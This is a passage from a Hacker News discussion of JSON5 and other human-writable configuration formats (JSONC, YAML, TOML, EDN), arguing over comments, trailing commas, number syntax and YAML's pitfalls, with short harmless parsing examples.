correct thing to do is to return an error and not try to guess. The point of an error bubbling up is asking for clarity from the end-user, while guessing will lead to random results in ways that can not be detected or corrected anymore later on in the process. I think Postel's law was intended to apply to alternative implementations of machine-level protocols. That's not to say that I don't agree that it might be better if JSON implementations would allow trailing commas, which is unlikely to lead to semantic ambiguities. That's too late now though, unless a new JSON to rule them all would appear and we would all agree on that new spec. reply SkyBelow 3 hours agorootparentprevIf we consider sigfigs, then isn't 100 and 100. two different numbers given one has a single significant digit and the other has 3? For 101 and 101. it doesn't matter because both have 3 significant digits. Then again, one may argue that it is better to write 1e2 and 1.00e2 instead of 100 and 100.. It also avoids the weirdness of the double period if the number with a dot ends a sentence. On a personal level, I also don't like ending a number with a . because my brain immediately parses it as a sentence ender and it interrupts my reading flow. reply _blk 16 hours agorootparentprevI never understood leading dot until I understood that native speakers indeed say \".3\" (point three). Trailing makes it a floating point type instead of an integer reply papercrane 15 hours agorootparentTrailing to signal a floating point seems like to niche of a use case to me. Generally it's best to treat every JSON number literal as a 64-bit float anyway for the sake of interoperability. reply SV_BubbleTime 15 hours agorootparentprevRight, you guys say like “naught point three”… sounds just as weird to us as ours does to you. Still… I can be required to put a zero in, read 0.3, and still think “that’s point three”. reply 404mm 14 hours agorootparentIt became quite normal for me to write 0.3 and read it as “point three”. I do agree that the English language makes it less awkward to just skip the zero. It leaves very little room for confusion. reply xelamonster 15 hours agorootparentprevWell what's more readable, .8675309 that is understood to have an implicit zero, or the parser giving up and unexpectedly making it a string? Maybe it's not your preference but I can't see any problem with making this more robust. The trailing one is strange to me but leaving off a leading zero isn't unusual at all for written numbers in my experience. reply The_Colonel 14 hours agorootparent> Well what's more readable, .8675309 that is understood to have an implicit zero Is it universally understood? I think it's a US / English thing. In my country I've never seen numbers written in this way and many people would not \"parse\" it mentally as 0.8675309 reply efitz 14 hours agorootparentI have never encountered an adult human being who would not be able to “parse” this mentally and come up with the correct value. If I did, I wouldn’t associate with them voluntarily as they would likely be an asshole, spending all their time bikeshedding and making everyone else miserable due to their inability to cope with someone not following their unwritten “rules”. reply layer8 3 hours agorootparentFor people who grew up in countries where comma is the decimal separator (and dot the thousands grouping separator), this is highly unintuitive, because it would seem much more likely to be a misplaced punctuation mark. It might be moderately intuitive to English native speakers because of oral usage like “point one three eight”, but that’s also not a thing in many other languages. reply The_Colonel 13 hours agorootparentprevWhat an extreme reaction. Many people would not be able to parse it since they've never seen a number written in this way, but you immediately write them off as assholes. Wow. reply efitz 5 hours agorootparentIt will look funny to many people but they will be able to interpret it. Remember that this thread is in the context of whether to be strict or relaxed in a specific file syntax for files intended to be authored by humans. reply The_Colonel 5 hours agorootparent> It will look funny to many people but they will be able to interpret it. You're still approaching this with the background knowledge of what this is. If you've never seen this, you can only guess, and there are a couple of options. I've been terminally online for the better part of the last 2 decades, yet I've seen this way of writing for the first time only ~5 year ago or so, and I still remember simply not knowing what it is. The first reaction is that it's simply a typo - the author mistyped - the dot should have been a digit or perhaps not be there at all. reply szszrk 13 hours agorootparentprevStripping zero is not a common practice. You are clearly speaking of your own bubble here. For most of the world that is even more ridiculous than using dot as decimal space separator or writing dates with month not in the middle place. Even Americans I work with don't write it like that when doing quick draft discussion, as they know it's confusing to others. reply efitz 5 hours agorootparentIt’s not about whether people normally write it that way. In the overall context of the thread it’s whether they ever write it that way. reply szszrk 4 hours agorootparentFrom my perspective no one does. Ever. I only know it's a thing because I watched some math-related edu shows. Didn't even see that when I briefly worked in US. reply oneeyedpigeon 3 hours agorootparentprev> even more ridiculous than ... writing dates with month not in the middle place Come on, let's be fair—nothing else will ever be as ridiculous as that! reply 404mm 14 hours agorootparentprevIMO the implicit zero is just as much an issue in regular written form. The period could be overlooked quite easily, but seeing a leading 0, one will know what’s really going on. How could the parser see it as a string? This is not YAML and JSON5 still requires quotation marks. reply appplication 19 hours agoparentprevAs a data guy I find myself running into JSONL a fair bit. It was surprising to me that it’s not supported in the vanilla spec. reply compootr 18 hours agorootparentas a student experimenting with millions of records of data, its pretty nice! reply nox101 15 hours agoparentprevJSONC is fine but VCS should have named its configuration files settings.jsonc since the files are not JSON and will not be parsed by JSON parsers. reply wvh 5 hours agorootparentI agree, if one of those myriad alternatives is to be used, at least specify that clearly. reply Cthulhu_ 3 hours agoparentprevThe choice of single vs double quotes means you can use single quotes if the contents contain a double quote and vice-versa. With JSON containing shell scripts (looking at package.json scripts) that's a valuable addon imo. reply AdieuToLogic 18 hours agoparentprev> The only thing that JSON is really missing are comments and trailing commas. I use JSONC for that. YAML[0] supports JSON formatted resources and octothorpe ('#') comments as well. I didn't see anything in the spec specifically allowing for trailing commas however. Here is an exemplar using the Ruby YAML module: #!/usr/bin/ruby require 'yaml' puts YAML.load( %/ # YAML is a strict superset of JSON, which # means supporting octothorpe end-of-line # comments is supported in JSON formatted # YAML if and only if the content is multi-line # formatted as well (like this example). { # This is valid YAML! \"foo\" : \"bar\" } / ) 0 - https://yaml.org/spec/1.2.2/ reply nine_k 18 hours agorootparentThe problem of yaml is that it allows too much. It allows unquoted strings, and those can be interpreted by the parser as numbers, timestamps, booleans, etc. This is a source of many fooguns. Use of indentation to denote nesting can sometimes be an anti-feature, too, because while using that the format does not provide a way to make certain that the entire stream has been read (parens balanced). This may lead to problems or even exploits. Pure JSON is so painful for human consumption though, I willingly choose yaml if it's the only alternative. JSON5 may indeed be a sweet spot between human-friendliness and lack of nasty surprises. reply AdieuToLogic 18 hours agorootparentAs I mentioned in a reply to a peer comment, the problems you describe regarding YAML appear to be about the commonly used format most of us think of and the totality of the YAML feature set. What is illustrated above is the definition of a specification-compliant YAML resource strictly using JSON constructs + octothorpe end-of-line comments. Does this usage mitigate the concerns you have identified? reply nine_k 17 hours agorootparentThe problem is that self-restraint only takes you so far. Typos exist. Human mistakes exist. Machine errors exist. Malicious inputs exist. A good parser does not just accept the inputs you find valid, but also rejects inputs you deem invalid. Running a linter that would report or amend all the footgun-wielding features of yaml before parsing is tanamount to running another parser. Then why bother :) reply milch 14 hours agorootparentprevUsing a YAML parser to parse JSON+comments is like bringing a tank to a knife fight... If you only parse \"trusted\" input, i.e. you can guarantee that no one is ever going to pass anything but JSON+comments, and you don't do it in any high-TPS scenarios it's probably fine to use a YAML parser reply ratorx 18 hours agorootparentprevWhilst YAML is an option, if the choice is between having the unnecessary extra features of JSON5 or YAML, JSON5 seems like the clear winner. Allowing multiple types of quotes may be an unnecessary feature but it is a clear lesser evil compared to the mountain of footguns that YAML brings with it. reply AdieuToLogic 18 hours agorootparentHow does defining a YAML resource strictly in terms of well-formed JSON + octothorpe comments introduce \"the mountain of footguns that YAML brings with it\"? reply ratorx 17 hours agorootparentIt doesn’t, quoting strings does solve almost all issues, but it does leave potential footguns for the future. If you don’t enforce it, in the future the “subset of YAML” property might get weaker, especially if someone else is modifying the config. If you treat config files the same as code, then using a safe subset of YAML is the same as using a safe subset of C. It is theoretically doable, but without extensive safeguards, someone will eventually slip up. reply thayne 12 hours agoparentprev> The only thing that JSON is really missing are comments and trailing commas. And multi-line strings. You don't always need that, but when you do, it's absence is very painful. reply stkdump 11 hours agorootparentAgreed. The workaround (arrays of strings) isn't great as it means an extra transformation has to be done between the reader and the usage. I would go so far as to say this is more important than comments. reply hippospark 18 hours agoparentprevAlso take a look at ASON [1]. ASON is a data format that evolved from JSON, introducing strong data typing and support for variant types. [^1] https://github.com/hemashushu/ason reply yread 10 hours agoparentprevI just add another property with noncolliding name as a comment. \"//key\":\"this is here so that foo bars\", \"key\":\"value\", valid JSON. Most software handles extra propertiesjust fine reply xelamonster 15 hours agoparentprevI'm not a fan of forcing single or double quotes because escape codes are such a pain to deal with and to me make things significantly harder to read than an inconsistent quoting style ever could. reply taeric 3 hours agoparentprevJSON only allowing double quotes is something I have grown to not care about, but as someone that was using JavaScript object literals before JSON became a thing, I confess I do not understand why it is an advantage? If you were at a place where it was a heavy discussion on what quote to use, I'm forced to think there were deeper cultural issues at play? Don't get me wrong, the ubiquity of JSON speaks for itself and is the reason to use it. But, to say it has tangible benefits feels very dishonest. reply numbsafari 20 hours agoparentprevAllowing for leading decimals without a preceding zero also seems like shifting a whole class of errors right. reply n144q 18 hours agoparentprev> the only thing that JSON is really missing Depending what you use JSON for, \"Numbers may be IEEE 754 positive infinity, negative infinity, and NaN.\" could be a huge plus. reply simoneau 18 hours agoparentprevSomeone just needs to write “JSON5: The Good Parts” and an aggressive linter to enforce it. reply catlifeonmars 18 hours agorootparentWhy not just a parser? Should be easy enough. reply Pxtl 18 hours agoparentprev> The only thing that JSON is really missing are comments and trailing commas. I use JSONC for that. It's what VSC uses for the config format and it works. I disagree. Human-friendy multiline strings aren't really optional for a serialization format that will inevitably also be used as a config format sometimes because those are the same problem. reply bawolff 20 hours agoprevAs much as i like this (yaml goes way too far, but trailing commas and comments would make json much nicer. I actually think this spec goes too far with single quotes) i hate that it is named json5. I think its unethical to imply you are the next version of something if you don't have the blessing of the original author. reply Dylan16807 20 hours agoparentEven when the original author said it was \"discovered\"? JSON5 is closer to \"javascript object notation\" than JSON itself. It's partly an update and partly a removal of arbitrary restrictions. reply yosito 18 hours agorootparentExcept that JSON is a valid JavaScript object, and JSON5 is not. reply Zamicol 18 hours agorootparentWhy is it not? My understanding is that it is a valid ES5 and forward object. reply ahartmetz 17 hours agorootparentprevUnless there's a direct lie in the description of JSON5 (\"subset of ECMAScript\"), JSON5 objects are valid JS objects. reply tubthumper8 14 hours agorootparentprevCan you provide an example? reply papa-whisky 20 hours agoparentprevI think the name just means that it sits in-between JSON and ES5 (i.e., it's a superset of JSON and subset of ES5). edit: well as this comment thread indicates, the name is pretty confusing for everyone :) reply wvh 5 hours agoparentprevCould also be construed as paying homage, though. I think the number 5 here is a reference to congruence with ECMA Script 5 rather than to imply a version of JSON. reply yonran 18 hours agoparentprevThe parser for tsconfig.json (typscript.parseConfigFileTextToJson(fileName, jsonText) or parseJsonText) seems to be what you want; I wonder if there is a name for that format. reply bobbylarrybobby 13 hours agorootparentI think JSONC is the term for json with comments and trailing commas reply The_Colonel 14 hours agoparentprevSingle quotes are useful for string contents containing many double quotes (e.g. XML). reply bawolff 11 hours agorootparentLots of things are useful. I think json has been succesful largely because it preferred minimalism over usefulness. reply The_Colonel 10 hours agorootparentIt's not a binary choice. I don't think if Crockford chose a slightly larger subset of JavaScript for JSON (such as JSON5), it would hurt its adoption. reply j1elo 20 hours agoparentprevI always thought that the name JSON5 pretends to be nothing more than a pun on Michael Jackson's original band, The Jackson 5. It sounds too similar! If it didn't originate from that, what else? reply bawolff 20 hours agorootparentThe project description describes it as json plus syntax from emcascript 5.1 (commonly called ES5) [the official name of javascript is emcascript]. I imagine that is where the name comes from. Although it doesn't really make sense since most of the stuff they add predates ES5. reply Zamicol 18 hours agorootparentYes, that is where the name comes from. reply dcre 20 hours agorootparentprevHa. There is no way that’s what it means unless you read that somewhere. reply zeven7 20 hours agorootparentprevI assumed it was a play on HTML5 ¯\\_(ツ)_/¯ reply yashap 20 hours agoprevI’m a fan of JSON5. A common criticism is “we’ve already got YAML for human readable config with comments,” but IMO YAML’s readability sucks, it’s too hard to tell what’s an object and what’s an array at a glance (at least, with the way it’s often written). When dealing with large YAML files, I find myself frequently popping them into online “YAML to JSON” tools to actually figure out WTF is going on. JSON5 is much easier to read, at least for me. reply stackskipton 20 hours agoparentThose two criticisms of YAML are at bottom of my list. Space as delimiter and lack of strict typing is what screws me over on daily basis as SRE. reply yashap 20 hours agorootparentFair, YAML has a lot of usability warts, and those suck too. Although personally I really do hate how tough it is to tell apart arrays and objects, at least with the most common YAML array/object style. reply Pxtl 18 hours agorootparentprevThis. I hate how all these serialization/config formats come out of dynamically typed languages. Static typing is a must. Then so many classes of errors go away. reply wruza 15 hours agorootparentJust static type then. You can’t trust incoming data shapes anyway, e.g. if it specifies a schema and doesn’t even follow it. You always expect something in a typed language, not anything. So validate it and that’s it. Thinking that dynamic data can be typed is a mistake. It can only be structured ([], {}, \"\", …) into basic types and then matched to some template. Any above-data section about types is as good as none. It can help a human to make sense of its shape, but that’s it. reply lmm 17 hours agorootparentprevYou might like Dhall reply couscouspie 20 hours agoparentprevJust in case you didn't know: With https://github.com/mikefarah/yq you can just immediately translate YAMLs like yq some.yaml -o json reply mdaniel 19 hours agorootparentA reimplementation of jq in golang supports reading yaml and, of course, emits json: https://github.com/itchyny/gojq#:~:text=supports%20reading%2... That one is likely more relevant than yq since folks in the json ecosystem are far more likely to be familiar with jq's syntax and thus using gojq is \"one stop shopping,\" not to mention that its error handling is light-years beyond jqlang's copy reply bbkane 14 hours agorootparentYes, but I LOVE yq's ability to update YAML files without stripping existing comments. For example, I use it to programmatically update similar (but not identical) GitHub Actions files across projects. reply AdieuToLogic 19 hours agoparentprev> When dealing with large YAML files, I find myself frequently popping them into online “YAML to JSON” tools to actually figure out WTF is going on. YAML is a strict superset of JSON, so defining the former in the syntax of the latter is fully supported by the spec. Perhaps not by every YAML library, to be sure, but those which do not are not conformant. From the YAML spec[0]: The YAML 1.23 specification was published in 2009. Its primary focus was making YAML a strict superset of JSON. 0 - https://yaml.org/spec/1.2.2/ reply Centigonal 14 hours agorootparentI'm confused about your point about YAML being \"strict superset of JSON\" leading to being able to convert YAML to JSON. If YAML is a strict superset, wouldn't that mean that YAML must have at least one feature that is not part of JSON? Wouldn't that make it impossible to define all YAML files as valid JSON? reply Dylan16807 13 hours agorootparentThey all turn into the same data types in the end. You can import a YAML and output a JSON. For a feature like references, you'd have to do the annoying thing and duplicate that section of the file. For a feature like unquoted strings or extra commas, you just quote the strings or remove the commas. The various YAML features are in between and mostly close to the latter. reply yashap 11 hours agorootparentprevFor sure, but most YAML you actually encounter does not use much in the way of JSON syntax, it looks a lot more like this: https://devblogs.microsoft.com/devops/wp-content/uploads/sit... Where arrays and objects just look too similar (IMO), white space is significant, most strings are unquoted, etc. And personally I find it quite difficult to really understand what’s going on there, at a glance, compared to JSON (or JSON5). reply dragonwriter 11 hours agorootparent> For sure, but most YAML you actually encounter does not use JSON syntax So what? YAML can be trivially mechanically translated between flow and block syntax. reply marcyb5st 20 hours agoparentprevWhat's your take on prototxt files? In my opinion it is the most readable format since you don't need square brackets for repeated fields/arrays. Additionally plugins let you link your prototxt file with the corresponding proto so you can spot errors right away. reply yashap 3 hours agorootparentDon’t have any experience with them. reply BurningFrog 20 hours agoparentprevIf you already have a bunch of JSON documents, you can keep using them with JSON5. That's a big advantage compared to converting to YAML. reply knowsuchagency 20 hours agorootparentsame is true of YAML as a JSON superset reply peterohler 31 minutes agoprevThere are a few more tolerant versions of JSON. In OjG I called the format SEN https://github.com/ohler55/ojg/blob/develop/sen.md reply alex-robbins 15 hours agoprevIt's too bad EDN [1] hasn't seen much adoption outside of the biblical paradise that is the Clojure ecosystem. [1]: https://en.m.wikipedia.org/wiki/Clojure#Extensible_Data_Nota... In fact, there doesn't seem to be a spec or standard for it, outside of the de facto standard used by Clojure and the programs in its orbit. I guess nobody's bothered to write a standard, because the people who are already using EDN are doing fine without one, and the people who aren't either don't know what it is or don't see its value. reply ledgerdev 14 hours agoparenthttps://github.com/edn-format/edn I too love edn, but unfortunately most other languages lib abandoned (eg. https://github.com/edn-format/edn-dot-net ). Looking around python seems relatively maintained which is great https://github.com/swaroopch/edn_format/issues reply sundarurfriend 3 hours agorootparentIs there an example of what it looks like in practice? The Wikipedia link above doesn't have it, its citation http://edn-format.org/ seems like it doesn't exist anymore, and this github page doesn't show a sample either. reply ledgerdev 46 minutes agorootparentIt's plain old clojure, more examples here https://learnxinyminutes.com/edn/ { :name \"John Doe\" :age 30 :languages [\"English\" \"Spanish\" \"French\"] :address {:street \"123 Main St\" :city \"Anytown\"} } reply avodonosov 13 hours agoparentprevDont be pessimistic - you are still free to used it. I used EDN outside of Clojure. The system needed a relatively large amount of config files, and I chose EDN as a better JSON. Looks familiar to everyone, but supports comments - the primary motivation for that choice. JSON-5 allows a single trailing comma. EDN simply ignores commas. You can have them, trailing or not. But they are really redundant and incur visual noise. Perhaps EDN can also be improved, but that's a good format. Convenient. reply bearjaws 18 hours agoprevThe whole reason JSON rules the world is because it's brutally simple. We already have 5+ replacements that are far more robust(XML, YML) and IMO they are not great replacements for JSON. Why? Because you can't trust most people with anything more complicated than JSON. I shutter at some of the SOAP / XML I have seen and whenever you enable something more complicated inevitably someone comes up with a \"clever\" idea that ruins your day. reply JoshTriplett 18 hours agoparent> The whole reason JSON rules the world is because it's brutally simple. I don't think that's the primary reason. JSON is pervasive because it started out being trivially parseable by JavaScript going back to when people just evaluated it, even before browsers had ridiculously high-perfomance safe JSON parsers. All the other formats are still harder to work with from JavaScript. If not for that, personally I'd advocate TOML, which is incredibly simple. reply bobbylarrybobby 13 hours agorootparentI find toml impossible to both read and write in all but the simplest cases. reply peeters 10 hours agorootparentprev> trivially parseable by JavaScript going back to when people just evaluated it Comments and all, ironically. I mean sure, \"and all\" would frequently include script injections etc, but you can't argue it wasn't more feature rich! reply Zamicol 18 hours agoparentprevWe use JSON5 for two reasons: 1. Comments 2. Trailing commas We don't use any other JSON5 features, which are primarily just that numbers may be encoded in hexadecimal and field names may have quotes elided. We typically encode values with RFC 4648 base 64 URI canonical with padding truncated (b64ut) with values too large to be a JSON number, so hex isn't useful anyway. We haven't found that omitting field name quotes is a big deal. reply dcreater 12 hours agorootparentWhy not use JSONC then? reply int_19h 1 hour agorootparentThere's no spec for JSONC, it's basically \"whatever VSCode does\". JSON5, in contrast, has an actual spec that has been stable for 6 years now. reply layer8 3 hours agoparentprevThe only reason JSON got any traction is because it was a subset of client-side JavaScript and thus natively supported in the browser. reply eterevsky 12 hours agoparentprevTo be precise, JSON was a replacement for XML, not the other way around. And the problem with XML was that it's way to verbose and difficult to write by hand, so it's exactly the opposite of the direction YAML/JSON5/... are taking. reply postalrat 3 hours agorootparentThe problem with XML was people were using it for every possible thing they could think of and 90% of those ideas were garbage. reply yencabulator 18 hours agoparentprevis yaml robust: no reply Diti 16 hours agorootparentEver since YAML 1.2, released in 2009(!), your YAML example would parse your input as “is yaml robust” for the key, and “no” for the value. reply Dylan16807 15 hours agorootparentI used to think that fixed things, then I learned how many parsers refuse to update. Like PyYAML. reply yencabulator 16 hours agorootparentprevNo, it wouldn't ;) Extra hint: scandinavian countries: - dk - no - se Edit: it's extremely unlikely a yaml parser implements that spec; the spec is irrelevant. reply Dylan16807 4 hours agorootparentOkay, I originally didn't respond, but your comment got upvoted out of gray so I'll put in the effort. Your claim of \"No, it wouldn't\" is simply wrong. They said \"since 1.2\" and you can't just ignore that when you're citing a 1.1 problem. The disclaimer that you edited in gets at a relevant point but it's not strong enough to make your claim actually be true. And the winky face and the \"hint\" just make things worse, since they knew exactly what you meant. reply andreif 3 hours agoprevI think main problem people trying to solve is treating JSON as computer-human interface. It was not designed for it and I don’t think we need to expand its use-case. You can perfectly use subset of YAML with much better readability for human interactions. I wrote custom parsers for subset I need with like 100 lines of Python code. JSON should stay as a loggable system-to-system format that you can render in a more readable way. reply andreif 3 hours agoparentActually, right this moment I am writing docs for my mini-yaml to generate JSON Schema Draft 4 for our EDA. Easy-peasy reply pbreit 2 hours agoparentprevJSON is pretty close and much more widely used/available. It's fine. reply sod 4 hours agoprevWhen I manage a project and have the freedom to choose my configuration structure, then I always use typescript. I never understood the desire to have configuration be in ini/json/jsonnet/yaml. A strongly typed configuration with code completion seems so much more robust. Except of course your usecase is to load or change the config via an API. I like what apple is doing with https://pkl-lang.org/ though. reply Dylan16807 7 minutes agoparentYou can apply typescript-based strong typing and code completion to JSON and similar. And then you can avoid making arbitrary code execution part of your config format. reply jillesvangurp 3 hours agoprevGood API design dictates that you should be flexible as to what you accept and strict about what you serve. Being flexible doesn't really break anything. Elasticsearch and Opensearch both actually have partial support for JSON5 (comments), which is a nice feature if you want to document e.g. a complex query or mapping choice. It won't return any comments in the response. So it won't break other parsers. Implementing JSON 5 support like this is a valid thing to do for any server. More broad support for this in parsers would be nice. I'd probably enable this on my own servers if this was possible. I'd need that to be supported in kotlinx.serialization. See discussion on this here: https://github.com/Kotlin/kotlinx.serialization/issues/797 reply fifilura 3 hours agoparent> Good API design dictates that you should be flexible as to what you accept and strict about what you serve. Being flexible doesn't really break anything. Do you have a source on that? I am not sure I agree. My gripe is with HOCON that accepts so many formats that after a while you have no idea what it is you are actually writing. You can have a conf file with 5 different formats of the same type of setting. Probably added to by 5 different developers. I'd rather have it throw an error in my face when I don't adhere. reply Zamicol 18 hours agoprevHijacking for a random concern: I love JSON, but one of the technical problems we've ran into with JSON is that the spec forgot about all special characters. I actually noticed it when reading Douglas Crockford's 2018 book, \"How JavaScript Works\". The mistake is on page 22.9 where it states that there are 32 control characters. There are not 32 control characters. There are 33 7-bit ASCII control characters and 65 Unicode control characters. When thinking in terms of ASCII, everyone always remembers the first 32 and forgets the 33rd, `del`. I then went back and noticed that it was also wrong in the RFC and subsequent revisions. (JSON is defined to be UTF-8 and is thus Unicode.) Below is a RFC errata report just to point out the error for others. Errata ID: 7673 Date Reported: 2023-10-11 Section 7 says: The representation of strings is similar to conventions used in the C family of programming languages. A string begins and ends with quotation marks. All Unicode characters may be placed within the quotation marks, except for the characters that MUST be escaped: quotation mark, reverse solidus, and the control characters (U+0000 through U+001F). It should say: The representation of strings is similar to conventions used in the C family of programming languages. A string begins and ends with quotation marks. All Unicode characters may be placed within the quotation marks, except for the characters that MUST be escaped: quotation mark, reverse solidus, and the control characters (U+0000 through U+001F, U+007F, and U+0080 through U+009F). Notes: There are 33 7-bit control characters, but the JSON RFC only listed 32 by omitting the inclusion of the last control character in the 7-bit ASCII range, 'del.' However, JSON is not limited to 7-bit ASCII; it is Unicode. Unicode encompasses 65 control characters from U+0080 to U+009F, totaling an additional 32 characters. The section that currently reads \"U+0000 through U+001F\" should include these additional control characters reading as \"U+0000 through U+001F, U+007F, and U+0080 through U+009F\" --- I've chosen `del` to be my favorite control character since so many engineers forget it. Someone needs to remember that poor little guy. reply jmull 3 hours agoparentThe errata seems like a mistake. Makes more sense to drop the term \"control character\" and leave the specification of which characters are not allowed as-is. The cat's already out of the bag on this one. Changing the characters now will create a lot of invalid JSON in the world, with more being generated all the time. reply rswail 12 hours agoparentprevNot to mention that it was set to be 127 so that it would be 8 holes punched out on paper tape, so you could use it to correct a paper tape by backspacing the tape by one position and hitting del. reply rixrax 6 hours agoprevThis should have been named NOTjson-somethingv5. Or similar. Now it is far from obvious for the uninitiated that this might not be the 'latest' version of JSON. And then they end up using this incompatible format by accident, when in all likelihood standard JSON would serve equally well or better in 95% of the use cases. reply sethops1 20 hours agoprevMay I suggest using TOML, which in my experience has been the perfect blend of human readability while having good tooling. https://toml.io/en/ reply hombre_fatal 19 hours agoparentLike YAML, it's only better in the simple case where everything is top-level and there's only one level of nesting. Once you want to have arrays of nested objects or objects with arrays, I immediately wish I was just reading JSON so I knew where I was in the tree. And for that reason, I don't think it's a full contender. I want an answer for the hard cases like nested data, not just another way to write the simple cases which is what TOML is. For example, [[a.b]] x = 1 [a] y = 2 Versus: { \"a\": { \"b\": [ { \"x\": 1 } ], \"y\": 2 } } It's easy to complain that the latter is noisier. But that's nothing compared to being clear. reply zahlman 19 hours agorootparentIt's not made explicit in the documentation, but TOML is very nearly a superset of JSON - just using `=` to separate key-value pairs instead of `:`, and requiring top-level names to be given explicitly, and requiring the \"inline\" bits to be on a single line. In TOML, your example can equivalently be: a = { b = [ { x = 1 } ], y = 2 } (And yes, that can be the entire document; you can have an inline table before the first table header.) Of course, this doesn't help if you want the top level to be an \"array\" rather than an \"object\" (in JSON parlance), or if you want the entire document to represent a single primitive value. But these uses are discouraged at best anyway. But really the goal of TOML is to highlight the location of important parts of the deserialized tree structure (hence the ability to use arbitrary long dotted paths in table headers) rather than the structure itself. It's IMO a beautiful implementation of the idea \"flat is better than nested\" from the Zen of Python, and it neatly sidesteps an issue I asked about many years ago on Stack Overflow (https://stackoverflow.com/questions/4372229 - the question was rightfully closed, as this sort of discussion doesn't fit the Q&A format; but it made sense to ask at the time). I don't know if a direct comparison of TOML to YAML is fair. Among other differences, the standard way to parse YAML in Python involves a third-party library that brings in a ~2.5 MB compiled C library. Every TOML implementation I encountered - including the one that made it into the standard library - is pure Python. reply lifthrasiir 11 hours agorootparent> But these uses are discouraged at best anyway. To my knowledge, such uses were discouraged only because of a security issue from evaluating a JSON string as a JavaScript code and not via something like JSON.parse. reply int_19h 1 hour agorootparentGiven that TOML is intended primarily as a format for configs, a config where the root value is an array or a primitive value is hardly a relevant scenario. reply arp242 18 hours agorootparentprevYour TOML is rather convoluted, a more normal way to write it would be: [a] b = [{x = 1}] y = 2 Or alternatively: a.b = [{x = 1}] a.y = 2 Some parsers allow newlines in TOML inline tables, so you can do: a = { b = [{x = 1}], y = 2, } That's supposed to be in the next TOML standard, but that seems indefinitely stalled as the (only) maintainer has seemingly lost interest and there hasn't been any movement for a long time. reply okanat 19 hours agorootparentprevThis is also the reason I prefer XML to JSON when things really got complex. XML is verbose but it is very readable on long form. I wish Rust actually used JSON or XML as Cargo file format. reply Alex-Programs 19 hours agorootparentI think it works quite nicely in Cargo as you don't generally need much nesting, but anything with depth should use JSON. It's the perfect format for clearly displaying hierarchy. reply okanat 8 hours agorootparentIt works only for trivial projects that are compiled in a roughly up-to-date and popular environment. Custom distros, vendored forks, closed-source software, firmware projects etc. all end up with hairy Cargo files. A systems language should recognize handling complexity gradually is a part of one of its use cases. reply viraptor 20 hours agoparentprevTheir dictionaries and arrays split into ini-like sections are not very readable though. The double [[ is just nasty and not possible to apply in all situations (array in map in array). reply zahlman 18 hours agorootparent> not possible to apply in all situations (array in map in array). Yes, that's largely why inline tables and arrays exist: >>> tomllib.loads(\"\"\" ... [[outer]] ... first = [1, 2, 3] ... second = [4, 5, 6] ... ... [[outer]] ... third = [7, 8, 9] ... fourth = [10, 11, 12] ... \"\"\") {'outer': [{'first': [1, 2, 3], 'second': [4, 5, 6]}, {'third': [7, 8, 9], 'fourth': [10, 11, 12]}]} reply lifthrasiir 11 hours agorootparentTOML explicitly disallows newlines in inline tables, so that's not a full solution (if you agree that there are some situations where multi-line inline tables are indeed required). reply bazzargh 15 hours agoprevA common thing in JSON/YAML alternatives is to support more types through syntax. I don't think this is a good idea. YAML already did this badly with the Norway problem, but JSON also has issues with eg \"is it float or int\", what about nulls, what about precision... and so on. There are many, many more types to support and all this does is complicate syntax; the types can be relegated to a schema. For example, where are dates, with or without timezones, what about durations, what about SI units for mass, current, what about currency, what about the positive integers only, numbers as hex, as octal, as base64... One format that _nearly_ gets it is NestedText https://nestedtext.org/en/latest/basic_syntax.html ... which means everything gets ingested as strings, dicts or lists, which vastly simplifies things; my quibbles with it would be it still went for multiple syntaxes (for dictionaries, multiline strings, inline vs multiline dicts&lists. And yet, it still didn't make comments part of the data model (which is so useful when processing or refactoring files). While it's not perfect, it does separate the validation of scalars, not stuffing someone's priority list of validations into incomprehensible syntax. YAML's been a decades long mistake and making JSON more like YAML is not the way to fix that. reply eknkc 20 hours agoprevI feel like the comments are the only important part. I’d rather not have single quoted strings or unquoted identifiers to be honest. Trailing commas are nice to have though. All I miss in JSON are comments and a native datetime type. Everything else, I’m fine with. reply sevensor 20 hours agoparentStrongly disagree about datetimes; they exist at a different semantic level and are entirely too easy to get wrong. reply int_19h 1 hour agorootparentLuckily, we have decades of experience in e.g. SQL, and existing and well-polished ISO specs on dates that can just be used as is without reinventing the wheel. reply wruza 15 hours agorootparentprevNot more than a string representing a date that gets interpreted after json.parse. reply BurningFrog 20 hours agoparentprevFor comments, adding \"_comment\": \"...\" fields can work pretty well. reply viraptor 20 hours agorootparentNot where the reader verifies the schema. And not when you want to write a long multiline comment. (Unless you want _comment1, _comment2, ...) reply btown 19 hours agorootparentAn array of strings works well here! Also, you can always preprocess to remove comments before validating! reply oneeyedpigeon 19 hours agorootparentIf you're preprocessing, you might as well just `grep -v ^#` and support 'real' comments. reply btown 3 hours agorootparentThere's power to it being valid JSON, though; it can be stored in databases optimized for JSON payloads, and edited with JSON editors. There's a real agility to liberally sprinkling JSONFields and JSON code editors across an auto-generated admin interface like the Django admin system, knowing that you can leave breadcrumbs for colleagues, and that anything starting with a `__` is fair game for comments any time you see such a key name. reply dariusj18 17 hours agoparentprevIMO it would be great if fields could have annotations for types that fall back as strings. Datetimes could be annotated for easier parsing. reply brap 20 hours agoprevWould it be correct to say that this is basically any valid JS code that describes an object, excluding the use of references and function definitions? If not, what is the difference, and why was it made to be different? reply zanecodes 19 hours agoparentI've always thought it would be nice to have a language whose spec describes a few different \"power levels\": 1. Literal values only (objects, arrays, strings, numerics, booleans, maybe datetimes), a la JSON, with standardized semantics 2. Literals, variable definitions and references, pure function definitions, and pure function calls, but prohibiting recursion, such that evaluation is not Turing-complete and any value is guaranteed to be able to be evaluated into its literal form in finite time 3. All of the above plus recursion and impure, side-effectful functions, custom type definitions, etc. This way, implementing a literal parser in other languages would be comparatively straightforward (much like JSON), since it wouldn't have to support variables or functions, but it would also be possible to define values using variables and pure functions (much like HCL or Nix) and then use the language's own evaluator binary (or perhaps a wrapped FFI library) to safely convert these into literal values that another language can parse, while guaranteeing that evaluation will not have side-effects. It would also leave open the escape hatch of using a \"full\" Turing-complete language with side-effects and recursion, while ensuring that using that escape hatch is a deliberate choice and not the default. I'm sure there are a few additional or hybrid levels that could be useful too (2 but with recursion? 1 but with variables?) but this seems like it would be a solid starting point. reply lmm 17 hours agorootparentYou might like the Noether programming language design https://github.com/noether-lang/noether/blob/4115cdb3f472360... , although I don't know if it'll ever be actually implemented. reply alexisread 19 hours agorootparentprevAgree, and this could be related to the libs you import (adding abilities), or the traits you specify (restricting). reply bawolff 20 hours agoparentprevSeems like the escapes are slightly different. No astral unicode escapes (e.g. \\u{123456} ). No octal escapes \\123 